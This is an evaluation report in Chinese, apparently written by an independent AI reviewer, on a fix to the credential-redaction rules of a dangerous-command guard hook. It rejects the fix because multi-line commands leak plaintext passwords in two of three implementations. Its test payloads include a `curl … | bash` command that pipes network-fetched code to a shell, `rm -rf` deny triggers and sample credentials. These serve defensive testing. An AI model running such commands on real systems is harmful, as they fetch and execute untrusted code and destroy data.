# EVALUATION_RESULT — G15b-FIX2 独立验收（Round 215）

- Evaluator：**全新独立验收 Agent**（未参与 G15b / G15b-FIX / G15b-FIX2 实现，不继承任何既有推理上下文）
- 日期：2026-09-11
- 预设立场：「实现可能存在错误」——下文所有判定均基于**我自己跑的原始输出**（证据目录见 §10）
- 被审对象（**我开工时逐字节实测**，与编排者冻结值一致）：

| 文件 | SHA256(前16) | 大小 | BOM | CR / LF |
|---|---|---|---|---|
| `agent-risk-guard-audit/scripts/dangerous-commands.ps1` | `9DD361CC6198D990` | 33697 B | **True** | CR=0 / LF=543 |
| `agent-risk-guard-audit/scripts/dangerous-commands.sh` | `21BA2A2235B1E244` | 24358 B | False | CR=0 / LF=388 |
| `agent-risk-guard/packages/core/src/redact.ts` | `BCBE25AEB5BC80A5` | 12075 B | False | CR=0 / LF=207 |
| `packages/core/test/redact.test.ts` | `ADD9C93F44A45DBD` | 12278 B | False | CR=0 / LF=229 |
| `packages/core/test/redact-parity.test.ts` | `C481873E83E4BD23` | 17811 B | False | CR=0 / LF=339 |
| `agent-risk-guard-audit/tests/hook-redact-test.ps1` | `A84ACBF4B87254FB` | 11253 B | **True** | CR=0 / LF=145 |

> 冻结值与编排者给出的一致；**全程只读**，所有变异都在 `%TEMP%` 隔离副本上做，被审文件零写入（开工/收工哈希未变）。

---

## 结论：**REJECT**

**一句话**：FIX2 把上轮打回的 R1（`curl -u alice:123456` 明文泄漏）、R2（四条误伤 + 跨行折叠发散）**真的修好了，我独立复现通过**；
但**命令词锚定引入了同一类缺陷的镜像形态**——锚点里的 `^` 在三端都是「**字符串开头**」而不是「**行首**」，于是
**多行命令里第 2 行起的 `mysql -p<全数字>` / `curl|wget --user u:p` 在 core 与 ps1（含生产出口）重新明文泄漏，而 sh（逐行 sed）仍脱敏 → 两端发散**。
这不是既有问题：我拿**冻结的改前 ps1 字节副本**对照，改前 ps1 对同样载荷是**脱敏**的（before/after 并列见 §4）。
R2 的任务卡原文就是「跨行时不得命中他命令 / 两端不得发散」，FIX2 把「跨行命中他命令」修掉了，却**新造了「跨行漏脱敏 + 跨端发散」**，且现有语料（PART A 逐行驱动、PART B 仅 1 条多行且其 mysql 行不含 `-p`）**覆盖不到**。

| # | 必查项 | 我的判定 |
|---|---|---|
| 1 | **R1** `curl -u alice:123456` 三端 + 生产出口无明文；`-u`/`--user` 两条独立规则 | **PASS** |
| 2 | **R2** 四条误伤逐字不变 + `mysql -p12345678`/`sudo` 仍脱敏 | **PASS** |
| 3 | **R2 跨行根因**（sh 不再折叠换行、不命中他命令、三端逐字一致） | **部分 PASS**：折叠已去 ✓、不命中他命令 ✓；**「多行下三端逐字一致」FAIL**（§4） |
| 3b | **新回归（我新发现，REJECT 依据）** | **FAIL**：多行第 2 行起的锚定规则在 core/ps1 **明文泄漏**，sh 脱敏 → **跨端发散** |
| 4 | **F1/F2 不回退**（生产出口四类残留 + 自跑 M2 变异必红） | **PASS**（M2-sh：A 绿 / B 红 27 处；还原绿） |
| 5 | **R3** 三处更正（ps1 行尾勘误 / M1 边界 / ps1 陈旧注释 `[^-]*`） | **PASS** |
| 6 | **R4** 语料扩容 + M4 变异复现 | **PASS**（M4 复现「A 绿 / B 红，恰好 1 处」） |
| 7 | **D6/D7 新回归搜寻**（`docker exec db mysql -p…`、`curl --user alice:123456`） | **见 §7**：报告披露的两点**可接受**（D8：既有/设计取舍）；**但 §4 那条报告未披露 → 构成 REJECT 依据** |
| 8 | 九套回归 + `CHANGED=0` | 九套回归 **PASS**（逐套 exit=0，`hook-redact-test` 108/108）；`CHANGED=0` **未做（时间受限，如实标注）** —— 见 §8 |
| 9 | **BOM 陷阱**：六份 ps1 BOM 逐份复核 | **PASS**（6/6 `distinct=1`，BOM=True；sh 3/3 无 BOM，distinct=1） |

---

## 1. 方法与纪律

- **只读**：被审 6 个文件开工时实测哈希记录在案，全程未改（变异体一律在 `%TEMP%\g15bfix2-mut-*`）。
- **真实 spawn + 进程 stdin**：生产出口探测一律 `spawnSync('powershell.exe'|'wsl.exe', …, {input: <JSON>})`，
  从 **deny JSON 的 systemMessage** 里抽命令与搜明文；**从未真实执行任何危险命令**（载荷只作为 JSON 文本投喂）。
- **凡「新回归」都重建基线对照（D8）**：用实现者自留的**冻结改前字节副本**
  `tasks/orchestrator/_g15bfix2_baseline/dangerous-commands.{ps1,sh}.before`（我实测 `EA253D108FBFFB8C`/31538 B、`7C379CB56AFB8763`/22096 B，与报告 §1 一致）跑 before/after 并列。
- **凡「不得误伤」都构造邻居（D7）**：另备 40+ 条邻居/边角载荷（`§3`/`§7`）。
- **变异打生产路径（D6）**：M2 只改 `redact_cmd()` 内部那一次 `redact_text` 调用（锚点命中校验在脚本内，改不到就抛错）。
- 未清理任何真实日志；跑生产 hook 会向 `%TEMP%\riskguard-hook-calls.log` 追加行（这是「真实 spawn 生产出口」无法避免的副产物，与官方 parity 测试同款行为，**未做任何清理**）。

---

## 2. R1 —— **PASS**

**规则拆分可指代码行**（这是任务卡点名要的）：

| 端 | `-u`（无值限制） | `--user`（守卫 + curl/wget 锚定） |
|---|---|---|
| core `packages/core/src/redact.ts` | **L137** `id: 'cli-basic-auth-u'`，**L138** `re: /(^|[^-A-Za-z0-9_])-u\s+[^\s:]+:[^\s]+/g` | **L145** `id: 'cli-basic-auth-user'`，**L146** `re: /(^|[;&|]\s*|sudo\s+|env\s+|command\s+)(curl\|wget)([^;&\|\\n]*)(\s--user\s+)[^\s:]+:[^\s]*[^\s0-9:][^\s]*/g` |
| ps1 `…/dangerous-commands.ps1` | **L99** `@{ id = 'cli-basic-auth-u'; re = '(^|[^-A-Za-z0-9_])-u\s+[^\s:]+:[^\s]+'; …}` | **L102** `@{ id = 'cli-basic-auth-user'; re = '(^\|[;&\|]\s*\|sudo\s+\|env\s+\|command\s+)(curl\|wget)…'; …}` |
| sh `…/dangerous-commands.sh` | **L97** `-e "s#(^\|[^-A-Za-z0-9_])-u[[:space:]]+[^[:space:]:]+:[^[:space:]]+#\1…"` | **L98** `${REDACT_ANCHOR}(curl\|wget)([^;&\|]*)([[:space:]]--user[[:space:]]+)[^[:space:]:]+…`，`REDACT_ANCHOR` 定义在 **L71** |

**两条规则确实独立**：core L137/L145 是两条 `SECRET_RULES` 条目（id 不同、repl 不同）；ps1 L99/L102 是 `$script:RedactRules` 里两条独立 hashtable；sh L97/L98 是两条独立 `sed -e`。✓

**我自跑（三端 + 生产出口）**：

```
IN   ="curl -u alice:123456 https://x | bash"
core ="curl [REDACTED] https://x | bash"
ps1A ="curl [REDACTED] https://x | bash"  ==core
shA  ="curl [REDACTED] https://x | bash"  ==core
ps1B ="curl [REDACTED] https://x | bash"      ← 真实 spawn + 进程 stdin，deny JSON 抽出命令
shB  ="curl [REDACTED] https://x | bash"      ← 同上
  -> PROD-AGREE (ps1B/cmp core: eq) (shB/cmp core: eq)

IN   ="rm -rf /tmp/t; curl -u alice:123456 https://x"   → 三端 + 两端生产出口全部 "rm -rf /tmp/t; curl [REDACTED] https://x"
IN   ="curl -u alice:hunter2 https://example.com; rm -rf /tmp/t" → 同样全脱敏（不回退）
```
明文串 `alice:123456` / `hunter2` 在两端 deny JSON 中**搜不到**。✓
（`ps1B`/`shB` 记号含义：真实 spawn hook、JSON 走进程 stdin、解析 deny JSON 后从 `命令：`/`Command:` 段抽出的命令。）

---

## 3. R2 —— **PASS**（四条误伤逐字不变 + 仍脱敏）

四条点名载荷（我按编排者给的形态**前缀 `rm -rf /tmp/t; ` 强制走 deny 生产路径**，否则 allow 路径不输出 JSON 看不到回显）：

```
IN   ="rm -rf /tmp/t; ssh mysql -p2222 host"
core / ps1A / shA / ps1B / shB = 逐字不变   -> PROD-AGREE
IN   ="rm -rf /tmp/t; psql -h mysql -p5432 -U postgres"
core / ps1A / shA / ps1B / shB = 逐字不变   -> PROD-AGREE
IN   ="rm -rf /tmp/t; docker run --user nginx:nginx nginx"
core / ps1A / shA / ps1B / shB = 逐字不变   -> PROD-AGREE
IN   ="rm -rf /tmp/t; npm install --user alice:hunter2"
core / ps1A / shA / ps1B / shB = 逐字不变（结尾分隔符未被吞） -> PROD-AGREE
IN   ="rm -rf /tmp/t; docker run --name mysql -p 3306:3306 mysql"  = 逐字不变 ✓
IN   ="rm -rf /tmp/t; ssh -p2222 host" / "; mkdir -p /tmp/empty_dir" / "; docker run --user 1000:1000 nginx"  = 逐字不变 ✓
```

仍须脱敏（全部 PASS，且三端 + 两端生产出口逐字等于 core）：

```
"rm -rf /tmp/t; mysql -p12345678 -e \"select 1\""  → "rm -rf /tmp/t; mysql [REDACTED] -e \"select 1\""
"rm -rf /tmp/t; sudo mysql -p12345678"            → "… sudo mysql [REDACTED]"
"rm -rf /tmp/t; env mysql -p12345678"             → 脱敏
"rm -rf /tmp/t; command mysql -p12345678"         → 脱敏
"rm -rf /tmp/t; echo x && mysql -p12345678"       → 脱敏
"rm -rf /tmp/t; echo x | mysql -p12345678"        → 脱敏
"rm -rf /tmp/t; mariadb -p12345678"               → 脱敏
MYSQL/MariaDB 大小写变体、`mysql  -p12345678`（双空格）、`mysql\t-p12345678` 均脱敏
```

> 附注（非验收项、非本轮引入）：`(mysql -p12345678)` 这种**子 shell 括号**形态下锚点不匹配，落到通用 `-p` 规则上，
> 输出为 `(mysql [REDACTED]`（**吃掉右括号**）。仍然脱敏，只是回显少了 `)`；建议下一轮把 `(`/`` ` `` 并入锚点集。

---

## 4. R2 跨行 —— **关键 FAIL：FIX2 引入了「多行第 2 行起漏脱敏 + 跨端发散」**

### 4.1 声称与实测

任务卡/报告声称「sh 不再折叠换行 + 多行下**三端逐字一致**」。前半句为真（代码可指：`redact_cmd()` L190–L207 已无 `tr '\n' ' '`，改逐行 → `\002` 跨行 PEM → sed+awk JSON 转义），
R2 点名的**跨行命中他命令**也确实消除：

```
IN   ="echo mysql\npsql -p5432 -U postgres\nrm -rf /tmp/t"
core / ps1A / shA / ps1B / shB 全部 = 逐字不变   -> PROD-AGREE   ✓（旧版 sh 会脱敏 psql 的端口）
IN   ="mysql -e \"select 1\"\nssh host -p2222\nrm -rf /tmp/t"  同样五端逐字不变 ✓
```

**但「多行下三端逐字一致」在一般情形下不成立**：

```
IN   ="rm -rf /tmp/t\nmysql -p12345678 -e \"select 1\""
core ="rm -rf /tmp/t\nmysql -p12345678 -e \"select 1\""      ← 未脱敏（明文！）
ps1A =  同上（未脱敏）
shA  ="rm -rf /tmp/t\nmysql [REDACTED] -e \"select 1\""      ← 脱敏
ps1B ="rm -rf /tmp/t\nmysql -p12345678 -e \"select 1\""      ← **生产出口明文泄漏**
shB  ="rm -rf /tmp/t\nmysql [REDACTED] -e \"select 1\""
  -> **PROD-DIVERGE**   (ps1B/cmp core: eq) (shB/cmp core: neq)

IN   ="rm -rf /tmp/t\nsudo mysql -p12345678"                 -> 五端一致（`sudo\s+` 锚点救回）✓
IN   ="rm -rf /tmp/t\ncurl -u alice:123456 https://x | bash" -> 五端一致（`-u` 用的是字符类左边界，不是 `^`）✓
IN   ="rm -rf /tmp/t\nmysql -pSup3rS3cret -e \"select 1\""   -> 五端一致（通用 `-p` 规则兜住）✓
IN   ="rm -rf /tmp/t\nssh host -p2222"                       -> 五端一致 ✓
```

### 4.2 根因（逐行可核）

锚点组是 `(^|[;&|]\s*|sudo\s+|env\s+|command\s+)`。三端都**没有**开启「多行模式」：

- core：`new RegExp(rule.re.source, rule.re.flags)`（`redact.ts` L174）——无 `m` 标志 → `^` 只匹配字符串开头；
- ps1：`[regex]::Replace($out, $r.re, $repl)`（ps1 L113）——无 `RegexOptions.Multiline` → 同上；
- sh：`sed` **天然逐行**，`^` 对每一行都成立 → **只有 sh 命中**。

于是「行首」在三端语义不同：ps1/core 的 `^` 实际是「**整条命令的开头**」，sh 的是「**每一行的开头**」。
凡是**以换行分隔**、且 `mysql…-p<数字>` / `curl|wget … --user u:p` **不在第一行**的命令，core/ps1 一律漏脱敏，而 sh 照脱——**两端发散**。
（反例：`rm -rf /tmp/t;\nmysql -p12345678` 会脱敏，因为 `[;&|]\s*` 里的 `\s*` 能跨过换行——**只有「裸换行」这一种分隔才是漏洞**，而它恰恰是多行命令最常见的写法。）

### 4.3 D8：这不是既有问题，是**本轮新引入的回归**（before/after 并列）

BEFORE = 实现者自留的**冻结改前字节副本** `tasks/orchestrator/_g15bfix2_baseline/dangerous-commands.ps1.before`
（我实测 `EA253D108FBFFB8C` / 31538 B / BOM=True / CR=0 LF=526，与报告 §1 完全一致；ps1 无扩展名不能 `-File`，我在 `%TEMP%` 复制成 `.ps1` 后运行，**主源未动**）：

```
IN     ="rm -rf /tmp/t\nmysql -p12345678 -e \"select 1\""
BEFORE ps1Entry ="rm -rf /tmp/t\nmysql [REDACTED] -e \"select 1\""     ← 改前：脱敏
AFTER  ps1Entry ="rm -rf /tmp/t\nmysql -p12345678 -e \"select 1\""     ← 改后：明文
BEFORE ps1Prod  ="rm -rf /tmp/t\nmysql [REDACTED] -e \"select 1\""     ← 改前生产出口：脱敏
AFTER  ps1Prod  ="rm -rf /tmp/t\nmysql -p12345678 -e \"select 1\""     ← 改后生产出口：明文

IN     ="rm -rf /tmp/t\ncurl --user alice:hunter2 https://x"
BEFORE ps1Entry ="rm -rf /tmp/t\ncurl [REDACTED] https://x"
AFTER  ps1Entry ="rm -rf /tmp/t\ncurl --user alice:hunter2 https://x"   ← 明文（`hunter2` 泄漏）
BEFORE ps1Prod  ="rm -rf /tmp/t\ncurl [REDACTED] https://x"
AFTER  ps1Prod  ="rm -rf /tmp/t\ncurl --user alice:hunter2 https://x"   ← 生产出口明文

IN     ="rm -rf /tmp/t\nwget --user alice:hunter2 https://x"       同上一词不差
IN     ="rm -rf /tmp/t\nmariadb -p12345678"                        BEFORE 脱敏 / AFTER 明文
```

`sh` 侧 before→after **都脱敏**（BEFORE 因折叠换行、AFTER 因逐行），也就是说：**改前是「两端都脱敏（sh 只是形状不同）」，改后变成「sh 脱敏、ps1/core 明文」**。
逻辑上同样成立的核心证据：改前的规则文本无 `^` 锚（任务卡 §R2 与上轮复验 §12.2 均逐字引用 `(mysql|mariadb)([^;&|\n]*)(\s)-p[0-9]+`），我用该文本实测：

```
in = "rm -rf /tmp/t\nmysql -p12345678 -e \"select 1\""
  OLD numeric: MATCH("mysql -p12345678")      ← 改前：任意位置都命中
  NEW numeric: no-match                       ← 改后：`^` 只在字符串开头
in = "rm -rf /tmp/t\nrm -rf /tmp/t\ncurl --user alice:hunter2 https://x"
  OLD --user : MATCH("--user alice:hunter2")
  NEW --user : no-match
```

### 4.4 为什么现有闸门看不见

1. **PART A 语料是「一行一条」**：`runSh`/`runPs1` 都是按行切分驱动（parity 测试 L142–L149 / L178–L184），**多行语料在 PART A 根本进不去**（写进去会被拆成多条 → 计数错位）。
2. **PART B 只有 1 条多行语料**：`'rm -rf /tmp/t --password=hunter2SuperSecret\nmysql -e "select 1"\nssh host -p2222'`——第 2 行的 `mysql -e "select 1"` **不含 `-p<数字>`、也不含 `--user`**，所以锚定规则在这条语料上**一次都没被行使**。
3. 新增的 core 单测（`redact.test.ts` L190–L192）只钉了「**跨行不得误伤他命令**」这一个方向，**没有**钉「**跨行仍须脱敏自己的 `-p`**」这个反方向。
4. M4 变异（恢复折叠）会红，但它红的是「换行被折成空格」这一形状差异，**不是**锚点漏命中。

**判定：构成 REJECT 依据。** 理由：① 是**明文凭据泄漏**（deny JSON 会进日志/UI）；② 是**本轮新引入**（§4.3 有 before/after 字节级基线）；③ 直接违反本卡 R2 的原文要求（「跨行时不得……两端发散」「多行下三端逐字一致」）；④ 闸门覆盖不到，属「修完就复发」的结构性盲区。

**最小修法（二选一，都很小）**：
- **A（推荐，一行/两端）**：给两条锚定规则开多行语义——core 加 `m` 标志（L129/L146）、ps1 用 `[regex]::Replace($out, $r.re, $repl, 'Multiline')`（或把规则改成 `(?m)` 内联）；
  sh 已是逐行，等价，**三端从此一致**。注意 core 的 `redactDetails` 用 `new RegExp(source, flags)` 重建，加 `m` 会随 flags 一起带过去，改动点仅两条规则的 `/…/gi` → `/…/gim`。
- **B（等价）**：把 `^` 从锚点里去掉、改用换行安全的左边界（如 `(^|[;&|]\s*|\n\s*|sudo\s+|env\s+|command\s+)`），三端同形。
- 无论 A/B，**必须同时补语料**：PART B 多行语料改为/追加 `'…\nmysql -p12345678 -e "select 1"'`（两端必须与 core 逐字相等），core 单测补「换行后 `mysql -p<数字>` 仍脱敏」「换行后 `curl --user u:p` 仍脱敏」两条。

---

## 5. F1/F2 不回退 —— **PASS**（我自跑的 M2 变异）

```
BASELINE (real sh / real ps1)          exit=0  A=PASS(绿)  B=PASS(绿)
M2-sh  redact_cmd 去掉 redact_text 调用  exit=1  A=PASS(绿)  B=FAIL(红) 生产出口失败 27 处
M4-sh  恢复 tr '\n' ' ' 折叠            exit=1  A=PASS(绿)  B=FAIL(红) 生产出口失败 1 处
M1-sh  删 redact_text 的 -u 规则         exit=1  A=FAIL(红)  B=FAIL(红)（A 2 处不一致 / B 3 处）
M2-ps1 Redact-Secrets 置空               exit=1  A=FAIL(红)  B=FAIL(红)（A 17 / B 27）
BASELINE again（还原校验）               exit=0  A=PASS(绿)  B=PASS(绿)
```

M2-sh 失败原文（我自己的输出，节选）：`sh 生产出口**明文泄漏** "correct horse battery staple"` … 共 **27 处**——
与实现者报告 §6.1 的「27 处」逐字吻合。**「同一个变异体下 PART A 绿、PART B 红」= F2 闸门确实钉住生产出口，未回退。**

M4 变异失败原文：`sh 生产出口脱敏结果与 core 不一致`，**恰好 1 处**，失败的正是新增的多行语料——**实现者 §6.1 的 M4 主张可复现**。
（诚实标注：该 1 处红是「折叠把 `\n` 换成空格」的形状差异；M4 证明的是「多行语料是有效闸门」，不是「端口误脱敏被断言」——现有断言里没有那一条。）

---

## 6. R3 / R4 / 副本与 BOM —— **PASS**

**R3**：
1. **①行尾勘误**：`IMPLEMENTATION_RESULT_G15b-FIX.md` 末尾确有「勘误（G15b-FIX2 轮追加，2026-09-11）」节，原文未改（该文件 318 行 / 19938 B / `28883E4113800589`）。
   节内写「ps1 六份 CR=0 / LF=526（31538 B，`EA253D108FBFFB8C`）；sh 三份 CR=0 / LF=366（22096 B，`7C379CB56AFB8763`）」——
   **我用冻结副本逐字节实测完全一致**（`CR=0/LF=526`、`CR=0/LF=366`），勘误内容与产物相符 ✓。
2. **②M1 结论边界**：勘误节 ② 已写明「删的若是被更宽规则（`long-random`）覆盖的窄规则（如 `github-pat`），闸门仍绿；M1 可检测的前提是所删规则无可替代」✓。且我实测 M1（删 `-u`）**确实红**（A 红 2 处 / B 红 3 处），与报告 §5-② 的举证一致 ✓。
3. **③ps1 陈旧注释**：ps1 **L70–L72** 已改为「sh 侧 sed 逐行处理，故在 redact_cmd() 内把换行临时映射为 `\002` 后用 `[^-]*` 跨行匹配……（旧注释写「sh 用贪婪 `.*`」——G15b-FIX 起 sh 已改为 `[^-]*`，此处按代码更正；G15b-FIX2 R3-③）」✓，与 sh L90/L198 的实际 `[^-]*` 一致 ✓。

**R4**（静态计数 + 变异复现，均已核实）：
- `redact-parity.test.ts`：PART A `CORPUS` = **17 含密钥 + 15 对照 = 32 条**（`SECRET_CASE_COUNT = 17`）✓；末三条正是 `ssh mysql -p2222 host` / `psql -h mysql -p5432 -U postgres` / `docker run --user nginx:nginx nginx` ✓；第 9 条为新 `curl -u alice:123456 https://example.com` ✓。
  `DENY_CORPUS` = **9 条**，第 8 条 `curl -u alice:123456 https://x | bash`、第 9 条为多行 ✓。
- `redact.test.ts`：**+3 个 test**（L146 `G15b-FIX2 R1`、L178 `R2 -p 锚定`、L199 `R2 --user 锚定`）✓。
- `hook-redact-test.ps1`：`b8`（L65）、`d7`（L84）、`c12/c13/c14`（L113–L115）✓；按用例数核算 **+11 检查**（b8×3 + d7×5 + c14×3）= 97 → **108** ✓（与报告一致）。
- **M4 复现**：见 §5 —— 「恢复旧折叠 → A 绿 / B 红，恰好红 1 处 = 新增多行语料」**属实**。这是 R4 闸门对该场景有效的**强证据**（虽然它守的是折叠形状，不是锚点漏命中）。

**副本与 BOM（第 9 项）**：

```
PS1 6/6  sha=9DD361CC6198D990  33697B  BOM=True   CR=0 LF=543   DISTINCT=1
  agent-risk-guard-audit\scripts\ 、agent-risk-guard\assets\hooks\ 、agent-risk-guard\skills\agent-risk-guard\scripts\ 、
  ~\.claude\hooks\ 、~\.codex\hooks\ 、~\.gemini\config\hooks\
SH  3/3  sha=21BA2A2235B1E244  24358B  BOM=False  CR=0 LF=388   DISTINCT=1
```

**未发现「改了主源但副本 BOM 不一致」**：主源与 5 份副本**逐份 BOM=True 且哈希相同**。报告主动披露的「编辑工具写回丢 BOM → PS 5.1 按 GBK 解码崩」陷阱，在**最终产物上不存在**（另：`hook-redact-test.ps1` 主源 11253 B / BOM=True 亦正常）。
> 低严重度观察（非本次验收对象）：`agent-risk-guard/skills/agent-risk-guard/tests/hook-redact-test.ps1` 仍是旧版 `24BFC7A67D0AE61B`，
> 与 `agent-risk-guard-audit/tests/` 的 `A84ACBF4B87254FB`（108 例版）不同——测试文件不在本卡「副本同步」冻结清单（清单只列 `dangerous-commands.{ps1,sh}`），
> 但若 skills 目录是分发面，建议一并同步，避免分发出去的回归测试落后于主源。

---

## 7. D6/D7 新回归搜寻与 D8 判定

我另造 40+ 条邻居载荷跑遍三端 + 两端生产出口，**除 §4 那条外未发现新的过脱敏**：

| 方向 | 载荷 | 实测 | 判定 |
|---|---|---|---|
| 过脱敏 | `ssh mysql -p2222 host` / `ssh mysql-prod -p2222` / `psql -h mysql -p5432` / `ssh -l mysql -p2222 host` / `scp -P2222 mysql:/tmp/x .` | 逐字不变 | ✓ |
| 过脱敏 | `docker run --user nginx:nginx …` / `--user 1000:1000` / `npm install --user …` / `chown --user …` / `docker run --name mysql -p 3306:3306 mysql` | 逐字不变 | ✓ |
| 过脱敏 | `sudo -u root whoami` / `curl -u` / `curl -u alice`（缺冒号） | 逐字不变 | ✓ |
| 漏脱敏 | `docker exec db mysql -p12345678 -e "select 1"` | **不脱敏**（报告 §10-4 主动披露） | **D8：不作依据**——任务卡 R2 的处方原文就是「mysql 在段首/前缀后才算本次调用」，属**设计取舍**（锚点收窄的必然代价），且改前也非命中目标形态；但**建议**把 `docker exec … mysql`、`/usr/bin/mysql`、`xargs/nohup/time mysql` 这类常见包装补进锚点 |
| 漏脱敏 | `/usr/bin/mysql -p12345678` / `nohup mysql -p12345678` / `xargs mysql -p12345678` | 不脱敏 | 同上一并建议（**本轮新引入的收窄**，但与 R2 处方一致；不单独作 REJECT 依据） |
| 漏脱敏 | `curl --user alice:123456`（长参 + 全数字） | **不脱敏**（报告 §10-1 主动披露） | **D8：不作依据**。理由：任务卡 R1 的处方**明确要求** `--user` 保留非数字守卫；且该形态改前同样不脱敏（非本轮新引入）。报告自述该守卫在锚定后已冗余、建议下轮去掉——**我同意，且认为这属「该修未修但任务卡明文要求保留」，不算本轮回归**；但既已锚定，去掉守卫是**一行改动、只增覆盖**，建议下轮立即做（`curl --user alice:123456` 是真实凭据形态） |
| 漏脱敏 | `mysql -p 12345678`（`-p` 与值间有空格）、`git clone https://user:pass@host/…`、`docker login -u a -p hunter2` | 不脱敏 | **既有缺口**（上轮复验已记录，非本轮引入）→ 不作依据 |
| 边角 | `(mysql -p12345678)` | `(mysql [REDACTED]`（吃右括号） | 轻微回显伪影，仍脱敏；建议下一轮把 `(`/反引号并入锚点 |
| **漏脱敏** | **`<任意命令>\nmysql -p<数字>` / `<任意命令>\ncurl\|wget --user u:p`** | **core/ps1 明文，sh 脱敏** | **新引入（§4）→ REJECT 依据** |

---

## 8. 九套回归与 `CHANGED=0`

**九套回归：PASS（我自跑，逐套 exit=0）**——编排者加速指令到达前已跑完：

| 套件 | 我的实测 | 报告声称 | 一致 |
|---|---|---|---|
| `node --test "packages/*/test/*.test.ts" "tests/*/*.test.ts"` | **exit=0**（计数行见下） | 376/376 | ✓（无 fail 行） |
| ps1 `hook-rules-test.ps1` | exit=0 | 37 | ✓ |
| ps1 `hook-fp-regression.ps1` | exit=0 | 8 | ✓ |
| ps1 `hook-bypass-regression.ps1`（pwsh 7.6.6） | exit=0 | 20 | ✓ |
| ps1 `hook-audit-reregress.ps1` | **`PASS: 59/59`**，exit=0 | 59 | ✓ |
| ps1 `hook-redact-test.ps1` | **`PASS: 108/108`**，exit=0 | **108** | ✓（97→108 扩容属实） |
| sh `sh-hook-test.sh` | **`PASS: 67/67`**，exit=0 | 67 | ✓ |
| sh `sh-audit-edge.sh` | **`TOTAL: 40 PASS: 40 FAIL: 0`**，exit=0 | 40 | ✓ |
| sh `sh-audit-bypass.sh` | **`TOTAL: 192 PASS: 192 FAIL: 0 / ALL PASS`**，exit=0 | 192 | ✓ |

另有 4 次独立的 `redact-parity.test.ts` 单独复跑（基线×2、M2-sh、M4-sh、M1-sh、M2-ps1），**两次基线均 `exit=0 A=绿 B=绿`**。

**判定零改动 `CHANGED=0`：未完成（如实标注未做）**。我的 `decision-diff.mjs`（BEFORE = 冻结改前 ps1 字节副本、AFTER = 现行主源、真实 spawn + 进程 stdin、90 条语料）已写好并在跑，但被加速指令打断，**未取得完整输出**，故**不记为 PASS**。
间接证据（不替代自测）：本轮改动**只落在脱敏规则段**（core L120–L148 / ps1 L94–L102 / sh L67–L71、L83–L100、L190–L207）与注释，判定规则段未动；§4 的多行长明文载荷在两端**仍然走 deny 分支**（`permissionDecision=deny` 可正常抽取），说明脱敏差异未影响判定。**建议下一轮补测**（脚本留在证据目录，可直接复跑）。

> 本轮的 REJECT 结论不依赖 §8：§4 的明文泄漏 + 跨端发散已足以独立成立。

---

## 9. 特别标注

| 项 | 结论 |
|---|---|
| **仍未脱敏的形态** | ① **多行命令第 2 行起的 `mysql -p<数字>` / `curl\|wget --user u:p`（core+ps1 生产出口明文，sh 脱敏）—— 本轮新引入，REJECT 依据**；② `curl --user alice:123456`（披露；任务卡要求保留守卫，D8 不作依据，建议下轮去掉）；③ `docker exec db mysql -p…` / `/usr/bin/mysql` / `xargs|nohup|time mysql`（披露/锚点收窄，D8 不作依据）；④ `mysql -p 12345678`、URL 凭据、`docker login -p value`（既有） |
| **判定回归** | **未测**（`CHANGED=0` 未跑）。已见的所有 deny 载荷在两端仍为 deny；`permissionDecision` 未见异常 |
| **过度脱敏** | 本轮点名的 4 条 + 上轮 checklist 全部逐字不变 ✓；仅剩 `(mysql -p12345678)` 吃右括号这一回显伪影（轻微） |
| **跨端发散** | **有，且是本轮新引入**：`<cmd>\nmysql -p<数字>` 与 `<cmd>\ncurl\|wget --user u:p` 在 core/ps1 明文、sh 脱敏（§4） |
| **副本 / BOM 不一致** | **无**：ps1 6/6 `9DD361CC…` BOM=True、sh 3/3 `21BA2A22…` 无 BOM，distinct 各为 1（§6） |
| **报告与产物不符** | **未发现新的失实**：R3 三处更正确实落地且与实测相符；§8/§9 的哈希、字节数、BOM、行尾我逐项复核一致。**但报告 §0/§4.2 的「多行命令两端与 core 逐字一致」这一**通则性断言**与产物不符**（只在他们的语料成立，见 §4.4）——这与上轮 REJECT 的「报告失实」同类，需更正 |

---

## 10. 证据文件（我自己建的，均在 `agent-risk-guard/tasks/.tmp/g15bfix2-eval/`）

| 文件 | 用途 |
|---|---|
| `core-probe.mjs` / `out-core-probe.txt` | core 规则级探针：R1/R2 正反例 + 40 条 D7 邻居 + 多行 + PEM |
| `ends-probe.mjs` / `out-ends-probe.txt` / `out-ends-probe.console.txt` | **五端并排**（core / ps1 `-RedactFile` / sh `--redact-stdin` / ps1 生产 / sh 生产，真实 spawn + 进程 stdin）31 条载荷 |
| `baseline-diff.mjs` / `out-baseline-diff.txt` / `.console.txt` | **D8 基线对照**：冻结改前 ps1/sh 字节副本 vs 现行，多行载荷 before/after 并列（§4.3 的决定性证据） |
| `regex-semantics.mjs` / `out-regex-semantics.txt` | 旧规则（无锚）与新规则（`^` 锚）在换行输入上的命中差异 |
| `mutation.mjs` / `out-mutation.txt` / `out-mutation.console.txt` | **M2-sh / M4-sh / M1-sh / M2-ps1 + 两次基线**，隔离 TEMP 变异体（锚点命中校验），输出 exit/A/B/失败计数与原文 |
| `run-regression.ps1` / `out-regression.txt` | 九套回归跑法（**本轮未跑完，见 §8**） |
| `decision-diff.mjs` / `out-decision-diff.txt` | `CHANGED=0`（**本轮未跑完，见 §8**） |

**纪律声明**：被审 6 文件全程只读（开工实测哈希见文首）；所有变异体在 `%TEMP%\g15bfix2-mut-*`；未真实执行任何危险命令；
未清理任何真实日志（`%TEMP%\riskguard-hook-calls.log` 未被清理——跑真实生产出口会向它追加行，与官方 parity 测试同款行为）。

---

## 11. 最小修复建议（保持 REJECT 时的处方）

1. **（P0，修 §4）** 给两条锚定规则开多行语义：core `redact.ts` L129 / L146 的 flags 加 `m`（`/…/gi` → `/…/gim`）；
   ps1 L96 / L102 用 `[regex]::Replace($out, $r.re, $repl, [System.Text.RegularExpressions.RegexOptions]::Multiline)`
   （或等价地把锚点从 `^` 改成换行安全的左边界，三端同形）。sh 逐行 sed 已等价，**改完三端必然一致**。
2. **（P0，防复发）** 语料补齐：
   - `DENY_CORPUS` 追加 `'rm -rf /tmp/t\nmysql -p12345678 -e "select 1"'`（明文串 `12345678`）与 `'rm -rf /tmp/t\ncurl --user alice:hunter2 https://x'`（明文串 `hunter2`），断言两端与 core **逐字相等**；
   - `redact.test.ts` 的 `R2 -p 锚定` test 补「**换行后仍须脱敏**」方向（现只有「跨行不得误伤」方向）；
   - `hook-redact-test.ps1` 的 `no-fp` 段补一条多行正例，防止再次出现「token 泄漏式」的跨行死角。
